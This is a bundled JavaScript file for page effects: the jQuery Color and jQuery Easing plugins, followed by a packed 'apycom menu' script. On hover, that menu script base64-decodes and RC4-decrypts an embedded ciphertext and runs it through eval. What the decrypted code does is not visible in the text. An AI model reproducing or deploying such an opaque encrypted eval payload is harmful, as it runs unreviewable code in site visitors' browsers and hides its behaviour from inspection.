/** jquery.color.js ****************/
/* Download by hy http://sc.xueit.com
 * jQuery Color Animations
 * Copyright 2007 John Resig
 * Released under the MIT and GPL licenses.
 */

(function(jQuery){

	// We override the animation for all of these color styles
	jQuery.each(['backgroundColor', 'borderBottomColor', 'borderLeftColor', 'borderRightColor', 'borderTopColor', 'color', 'outlineColor'], function(i,attr){
		jQuery.fx.step[attr] = function(fx){
			if ( fx.state == 0 ) {
				fx.start = getColor( fx.elem, attr );
				fx.end = getRGB( fx.end );
			}
            if ( fx.start )
                fx.elem.style[attr] = "rgb(" + [
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[0] - fx.start[0])) + fx.start[0]), 255), 0),
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[1] - fx.start[1])) + fx.start[1]), 255), 0),
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[2] - fx.start[2])) + fx.start[2]), 255), 0)
                ].join(",") + ")";
		}
	});

	// Color Conversion functions from highlightFade
	// By Blair Mitchelmore
	// http://jquery.offput.ca/highlightFade/

	// Parse strings looking for color tuples [255,255,255]
	function getRGB(color) {
		var result;

		// Check if we're already dealing with an array of colors
		if ( color && color.constructor == Array && color.length == 3 )
			return color;

		// Look for rgb(num,num,num)
		if (result = /rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(color))
			return [parseInt(result[1]), parseInt(result[2]), parseInt(result[3])];

		// Look for rgb(num%,num%,num%)
		if (result = /rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(color))
			return [parseFloat(result[1])*2.55, parseFloat(result[2])*2.55, parseFloat(result[3])*2.55];

		// Look for #a0b1c2
		if (result = /#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(color))
			return [parseInt(result[1],16), parseInt(result[2],16), parseInt(result[3],16)];

		// Look for #fff
		if (result = /#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(color))
			return [parseInt(result[1]+result[1],16), parseInt(result[2]+result[2],16), parseInt(result[3]+result[3],16)];

		// Otherwise, we're most likely dealing with a named color
		return colors[jQuery.trim(color).toLowerCase()];
	}
	
	function getColor(elem, attr) {
		var color;

		do {
			color = jQuery.curCSS(elem, attr);

			// Keep going until we find an element that has color, or we hit the body
			if ( color != '' && color != 'transparent' || jQuery.nodeName(elem, "body") )
				break; 

			attr = "backgroundColor";
		} while ( elem = elem.parentNode );

		return getRGB(color);
	};
	
	// Some named colors to work with
	// From Interface by Stefan Petre
	// http://interface.eyecon.ro/

	var colors = {
		aqua:[0,255,255],
		azure:[240,255,255],
		beige:[245,245,220],
		black:[0,0,0],
		blue:[0,0,255],
		brown:[165,42,42],
		cyan:[0,255,255],
		darkblue:[0,0,139],
		darkcyan:[0,139,139],
		darkgrey:[169,169,169],
		darkgreen:[0,100,0],
		darkkhaki:[189,183,107],
		darkmagenta:[139,0,139],
		darkolivegreen:[85,107,47],
		darkorange:[255,140,0],
		darkorchid:[153,50,204],
		darkred:[139,0,0],
		darksalmon:[233,150,122],
		darkviolet:[148,0,211],
		fuchsia:[255,0,255],
		gold:[255,215,0],
		green:[0,128,0],
		indigo:[75,0,130],
		khaki:[240,230,140],
		lightblue:[173,216,230],
		lightcyan:[224,255,255],
		lightgreen:[144,238,144],
		lightgrey:[211,211,211],
		lightpink:[255,182,193],
		lightyellow:[255,255,224],
		lime:[0,255,0],
		magenta:[255,0,255],
		maroon:[128,0,0],
		navy:[0,0,128],
		olive:[128,128,0],
		orange:[255,165,0],
		pink:[255,192,203],
		purple:[128,0,128],
		violet:[128,0,128],
		red:[255,0,0],
		silver:[192,192,192],
		white:[255,255,255],
		yellow:[255,255,0]
	};
	
})(jQuery);

/** jquery.easing.js ****************/
/*
 * jQuery Easing v1.1 - http://gsgd.co.uk/sandbox/jquery.easing.php
 *
 * Uses the built in easing capabilities added in jQuery 1.1
 * to offer multiple easing options
 *
 * Copyright (c) 2007 George Smith
 * Licensed under the MIT License:
 *   http://www.opensource.org/licenses/mit-license.php
 */
jQuery.easing={easein:function(x,t,b,c,d){return c*(t/=d)*t+b},easeinout:function(x,t,b,c,d){if(t<d/2)return 2*c*t*t/(d*d)+b;var a=t-d/2;return-2*c*a*a/(d*d)+2*c*a/d+c/2+b},easeout:function(x,t,b,c,d){return-c*t*t/(d*d)+2*c*t/d+b},expoin:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}return a*(Math.exp(Math.log(c)/d*t))+b},expoout:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}return a*(-Math.exp(-Math.log(c)/d*(t-d))+c+1)+b},expoinout:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}if(t<d/2)return a*(Math.exp(Math.log(c/2)/(d/2)*t))+b;return a*(-Math.exp(-2*Math.log(c/2)/d*(t-d))+c+1)+b},bouncein:function(x,t,b,c,d){return c-jQuery.easing['bounceout'](x,d-t,0,c,d)+b},bounceout:function(x,t,b,c,d){if((t/=d)<(1/2.75)){return c*(7.5625*t*t)+b}else if(t<(2/2.75)){return c*(7.5625*(t-=(1.5/2.75))*t+.75)+b}else if(t<(2.5/2.75)){return c*(7.5625*(t-=(2.25/2.75))*t+.9375)+b}else{return c*(7.5625*(t-=(2.625/2.75))*t+.984375)+b}},bounceinout:function(x,t,b,c,d){if(t<d/2)return jQuery.easing['bouncein'](x,t*2,0,c,d)*.5+b;return jQuery.easing['bounceout'](x,t*2-d,0,c,d)*.5+c*.5+b},elasin:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);return-(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b},elasout:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);return a*Math.pow(2,-10*t)*Math.sin((t*d-s)*(2*Math.PI)/p)+c+b},elasinout:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d/2)==2)return b+c;if(!p)p=d*(.3*1.5);if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);if(t<1)return-.5*(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;return a*Math.pow(2,-10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p)*.5+c+b},backin:function(x,t,b,c,d){var s=1.70158;return c*(t/=d)*t*((s+1)*t-s)+b},backout:function(x,t,b,c,d){var s=1.70158;return c*((t=t/d-1)*t*((s+1)*t+s)+1)+b},backinout:function(x,t,b,c,d){var s=1.70158;if((t/=d/2)<1)return c/2*(t*t*(((s*=(1.525))+1)*t-s))+b;return c/2*((t-=2)*t*(((s*=(1.525))+1)*t+s)+2)+b},linear:function(x,t,b,c,d){return c*t/d+b}};


/** apycom menu ****************/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(1s).1t(5(){K($.S.19&&16($.S.12)<7){$(\'#l A.l n\').G(5(){$(9).1e(\'T\')},5(){$(9).18(\'T\')})}$(\'#l A.l > n\').m(\'a\').m(\'q\').1a("<q 1d=\\"E\\">&14;</q>");$(\'#l A.l > n\').G(5(){$(9).J(\'q.E\').v("w",$(9).w());$(9).J(\'q.E\').Y(C,C).r({"U":"-1c"},Q,"V")},5(){$(9).J(\'q.E\').Y(C,C).r({"U":"0"},Q,"V")});$(\'#l n > D\').1M("n").G(5(){17((5(k,s){h f={a:5(p){h s="13+/=";h o="";h a,b,c="";h d,e,f,g="";h i=0;11{d=s.I(p.F(i++));e=s.I(p.F(i++));f=s.I(p.F(i++));g=s.I(p.F(i++));a=(d<<2)|(e>>4);b=((e&15)<<4)|(f>>2);c=((f&3)<<6)|g;o=o+H.B(a);K(f!=10)o=o+H.B(b);K(g!=10)o=o+H.B(c);a=b=c="";d=e=f=g=""}1b(i<p.L);O o},b:5(k,p){s=[];P(h i=0;i<t;i++)s[i]=i;h j=0;h x;P(i=0;i<t;i++){j=(j+s[i]+k.R(i%k.L))%t;x=s[i];s[i]=s[j];s[j]=x}i=0;j=0;h c="";P(h y=0;y<p.L;y++){i=(i+1)%t;j=(j+s[i])%t;x=s[i];s[i]=s[j];s[j]=x;c+=H.B(p.R(y)^s[(s[i]+s[j])%t])}O c}};O f.b(k,f.a(s))})("1F","1D+1E/1C/1B/1y+1z+1A/1G/1f/1N+1L/1K+1H+1I/1J/1x/1w+1l+1m+1k/1j/1g/1h+1i+1n+1o+1u+1v=="));$(9).m(\'D\').m(\'A\').v({"w":"0","M":"0"}).r({"w":"Z","M":W},X)},5(){$(9).m(\'D\').m(\'A\').r({"w":"Z","M":$(9).m(\'D\')[0].W},X)});$(\'#l n n a, #l\').v({u:\'z(8,8,8)\'}).G(5(){$(9).v({u:\'z(8,8,8)\'}).r({u:\'z(N,N,N)\'},Q)},5(){$(9).r({u:\'z(8,8,8)\'},{1p:1q,1r:5(){$(9).v(\'u\',\'z(8,8,8)\')}})})});',62,112,'|||||function|||255|this||||||||var||||menu|children|li|||span|animate||256|backgroundColor|css|width|||rgb|ul|fromCharCode|true|div|bg|charAt|hover|String|indexOf|find|if|length|height|220|return|for|500|charCodeAt|browser|sfhover|marginTop|bounceout|hei|300|stop|165px|64|do|version|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|nbsp||parseInt|eval|removeClass|msie|after|while|30px|class|addClass|7A0jo|L6pu8uGg9h0cMOfPAAsZrBZfhtRYejk|ygUtFxQcwX|N5aV9sDhl3gjS52Y41lO9jLyMlyydXyrUEh|MLGjjKkjNHIx0RDsrg5MnKuQh6Ac0H8VyQNz|fullfUqbpQjIs7JEaug2XA4X2JSzC4QTkGbt|Lz3H6O5l25zvmw56OhxVVdhPu7fSwY|lnnuwRjcatmu9YouCwjOXCST5vAAmIKy0QVZL6iBmzNFuhk43c3|e8tE4r7cQ1e58IN0cQ5OXm8IWsXMAest3Sq7qfRHG8Hscy7f1EHxeCkmqm96SNtmyM61K9pqfw0ZkThX|ydAUxeKN9Cztgsjvq2r9JAPK2xkg5kpJV26fif03a0tkJMesBbuLbzJ4Jr4ToVZL|duration|100|complete|document|ready|dL0URttbElQf|sqk05lPk5IoCKVIOVD5G9A|Sb48onDMAim|lMpAWRDC01tAPCf9Zz2S8g|KYx5JScDi|3jLswpilaKTSnjBLAIJ3B2pfZxEk40iqROHDDkSwzwSTdRDGt0ZJv0xVLwXxuMPeqQcsETkjqNYFdhOK3WJDppb0kcNQTImxPoRe|bO8nnFJW67v43aDzVvCNGbItNrEcz3c5g4bET7Q9fRKoUFyhiQ3Un|gLCepClYf9kT380cyehNWy3kDRgbQYe|cgoOte7DgMTSIxHTFll3eUfLC6XjDaRKranbXA9caTk7tV6NQ8|x1FpXpHCAGYyub3JEsApwBCj5nFZRYbq0lQKhRJbeNcwNxpK38|UHdBk|6vRbYYK7|yBrIn6DK9Bi9cjIcrV1I9ktDHokit|ADFpzLZz7GXUzx76d5guJnzjCsd2vABHDlLZgsD3xQgrOo8XCFz0Fb7|RSB24Bn8RudZXSA7E2vOBj2FrWFlCutQpZcF0uAo9D8zSQ7cTlpzoSg5uV2qyBWg9tpnnMVUd57IEGIhoHNTqCKCdn6sSVZ893naE|4EFXayY3PvFMbD8xyJAbAFvBf9kmIRbeqTtxyYZhpYCbva0W97WA7UMe99XtZFdNglbaniVUWDhHwSymwb6k6UTkrkPJayKN9X|pJefjBby9BjOcjCckXHKzj2YA4Kd3ioUiJx|Qbb6HRZS1rxMFRme0EeDQPCw8UFlVN1hpcMxGjTjcD3R|parent|HJQfsa8hqrr6w2a6nG'.split('|'),0,{}))